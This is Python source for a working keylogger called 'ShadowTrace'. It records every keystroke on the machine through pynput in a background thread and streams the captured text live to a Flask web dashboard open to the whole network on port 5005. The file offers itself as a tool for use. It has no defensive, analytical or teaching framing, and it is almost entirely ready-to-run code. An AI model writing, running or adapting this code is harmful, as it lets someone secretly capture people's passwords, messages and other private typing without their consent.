import threading
import logging
from flask import Flask, render_template_string, jsonify
from pynput.keyboard import Key, Listener

app = Flask(__name__)
log_storage = []
clean_text = ""

def on_press(key):
    global clean_text
    
    key_str = str(key).replace("'", "")

    if key == Key.space:
        clean_text += " "
        log_storage.append(" ")
    elif key == Key.enter:
        clean_text += "\n"
        log_storage.append("<br>[ENTER]<br>")
    elif key == Key.backspace:
        clean_text = clean_text[:-1]
        log_storage.append(" [⌫] ")
    elif "Key" in str(key):
        log_storage.append(f" <span class='special'>[{str(key).split('.')[1].upper()}]</span> ")
    else:
        clean_text += key_str
        log_storage.append(key_str)

    if len(log_storage) > 1000:
        log_storage.pop(0)

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowTrace // Live Monitor</title>
    <style>
        :root { --bg: #000000; --term: #0f0; --dim: #003300; --white: #fff; }
        body {
            background-color: var(--bg); color: var(--term);
            font-family: 'Courier New', monospace; margin: 0; padding: 20px;
            overflow: hidden;
        }
        .header {
            border-bottom: 2px solid var(--term); padding-bottom: 10px;
            margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;
        }
        .status { animation: blink 1s infinite; color: red; font-weight: bold; }
        
        .container { display: flex; gap: 20px; height: 85vh; }
        
        .panel {
            border: 1px solid var(--dim); padding: 15px;
            background: #050505; border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        
        #live-feed {
            flex: 2; overflow-y: auto; font-size: 1.1rem;
            line-height: 1.5; white-space: pre-wrap; word-wrap: break-word;
        }
        
        .special { color: #008800; font-size: 0.8rem; }
        
        #stats-panel { flex: 1; display: flex; flex-direction: column; gap: 20px; }
        .stat-box { text-align: center; border: 1px solid var(--dim); padding: 20px; }
        .big-num { font-size: 3rem; font-weight: bold; color: var(--white); }

        .btn-reset {
            background: transparent;
            color: #ff4444;
            border: 1px solid #ff4444;
            padding: 12px 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
        }
        .btn-reset:hover {
            background: #ff4444;
            color: #000;
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
        }
        .btn-reset:active {
            transform: scale(0.98);
        }

        .alert-toast {
            display: none;
            color: #0f0;
            font-size: 0.85rem;
            margin-top: 10px;
            text-align: center;
        }
        
        @keyframes blink { 50% { opacity: 0; } }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #003300; }
    </style>
</head>
<body>
    <div class="header">
        <div>SHADOW_TRACE v1.0 <span style="font-size:0.8rem; color:#666;">// PORT: 5005</span></div>
        <div class="status">● RECORDING LIVE</div>
    </div>

    <div class="container">
        <div id="live-feed" class="panel"><span style="color:#666;">Waiting for input...</span></div>

        <div id="stats-panel">
            <div class="panel stat-box">
                <div class="label">TOTAL KEYSTROKES</div>
                <div id="count" class="big-num">0</div>
            </div>
            <div class="panel stat-box">
                <div class="label">SYSTEM STATUS</div>
                <div style="color: var(--term); margin-top:10px;">ACTIVE MONITORING</div>
            </div>
            <div class="panel stat-box">
                <div class="label" style="margin-bottom: 12px;">BUFFER CONTROLS</div>
                <button id="reset-btn" class="btn-reset" onclick="resetLogs()">RESET BUFFER</button>
                <div id="reset-toast" class="alert-toast">✔ BUFFER CLEARED</div>
            </div>
        </div>
    </div>

    <script>
        let isResetting = false;

        function fetchLogs() {
            if (isResetting) return;
            fetch('/update')
                .then(response => response.json())
                .then(data => {
                    const feed = document.getElementById('live-feed');
                    if (data.logs && data.logs.length > 0) {
                        feed.innerHTML = data.logs.join('');
                    } else {
                        feed.innerHTML = '<span style="color:#666;">Waiting for input...</span>';
                    }
                    feed.scrollTop = feed.scrollHeight;
                    document.getElementById('count').innerText = data.count;
                })
                .catch(err => console.error('Fetch error:', err));
        }

        function resetLogs() {
            isResetting = true;
            fetch('/reset', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('live-feed').innerHTML = '<span style="color:#666;">Waiting for input...</span>';
                    document.getElementById('count').innerText = '0';
                    const toast = document.getElementById('reset-toast');
                    toast.style.display = 'block';
                    setTimeout(() => {
                        toast.style.display = 'none';
                        isResetting = false;
                    }, 1200);
                })
                .catch(err => {
                    console.error('Reset error:', err);
                    isResetting = false;
                });
        }

        setInterval(fetchLogs, 500);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/update')
def update():
    return jsonify({
        'logs': log_storage,
        'count': len(log_storage)
    })

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    global clean_text, log_storage
    log_storage.clear()
    clean_text = ""
    return jsonify({
        'status': 'success',
        'logs': [],
        'count': 0
    })

if __name__ == '__main__':
    print("---------------------------------------------")
    print("   SHADOW_TRACE INITIALIZED")
    print("   1. Keylogger running in background...")
    print("   2. Web Interface running on Port 5005")
    print("---------------------------------------------")

    logger_thread = threading.Thread(target=start_keylogger)
    logger_thread.daemon = True 
    logger_thread.start()

    app.run(host='0.0.0.0', port=5005, debug=False)